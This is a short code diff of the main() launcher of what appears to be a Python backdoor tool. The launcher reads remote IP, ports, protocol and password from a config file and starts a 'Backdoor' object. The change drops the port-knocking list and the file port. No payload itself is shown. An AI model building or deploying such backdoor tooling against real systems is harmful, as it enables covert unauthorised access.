@@ -13,10 +13,9 @@ def main():
     protocol = config.get('General', 'protocol')
     password = config.get('Encryption', 'password')
     filePort = config.get('General', 'filePort')
-    knockList = config.get('General', 'knockList')
 
-    print(localIP, localPort, filePort, remoteIP, remotePort, protocol, password)
-    backdoor = Backdoor(localIP, localPort, filePort, remoteIP, remotePort, protocol, password, knockList)
+    print(localIP, localPort, remoteIP, remotePort, protocol)
+    backdoor = Backdoor(localIP, localPort, remoteIP, remotePort, protocol, password)
     backdoor.run()
 
 if __name__ == '__main__':
